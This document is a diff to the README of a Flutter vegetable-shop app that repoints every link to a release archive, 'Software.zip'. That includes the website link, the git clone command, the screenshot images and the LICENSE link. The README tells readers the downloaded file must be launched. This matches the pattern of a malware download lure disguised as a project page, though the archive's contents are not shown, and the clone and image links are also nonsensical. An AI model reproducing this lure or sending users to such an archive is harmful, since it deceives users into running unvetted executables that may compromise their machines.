@@ -22,17 +22,17 @@ Welcome to E-VeggieStore, a modern e-commerce mobile app built with Flutter that
 
 ## 📦 Installation
 To get started with E-VeggieStore, download the app from the following link:  
-[<img src="https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip%20Release-Here-brightgreen">](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)
+[<img src="https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip%20Release-Here-brightgreen">](https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip)
 
 *Note: Downloaded file needs to be launched to run the app.*
 
 ### 🌐 Visit Our Website
-Explore more about E-VeggieStore on our [official website](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip).
+Explore more about E-VeggieStore on our [official website](https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip).
 
 ## 🌟 Get Started
 1. **Clone the Repository**
 ```bash
-git clone https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip
+git clone https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip
 ```
 
 2. **Navigate to the Project Directory**
@@ -53,20 +53,20 @@ flutter run
 ## 📸 Screenshots
 Here are some snapshots of the app in action:
 
-![Home Screen](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)  
+![Home Screen](https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip)  
 *The vibrant and welcoming home screen of E-VeggieStore.*
 
-![Product Page](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)  
+![Product Page](https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip)  
 *Explore a variety of fresh vegetables on the product page.*
 
-![Cart Preview](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip)  
+![Cart Preview](https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip)  
 *Effortlessly manage your shopping cart and proceed to checkout.*
 
 ## 🌍 Contributing
 Contributions are welcome! If you have ideas for enhancements or new features, feel free to open an issue or submit a pull request.
 
 ## 📝 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/khangsieulord/E-VeggieStore/releases/download/v1.0/Soft.zip) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/khangsieulord/E-VeggieStore/releases/download/v2.0/Software.zip) file for more details.
 
 ---
 
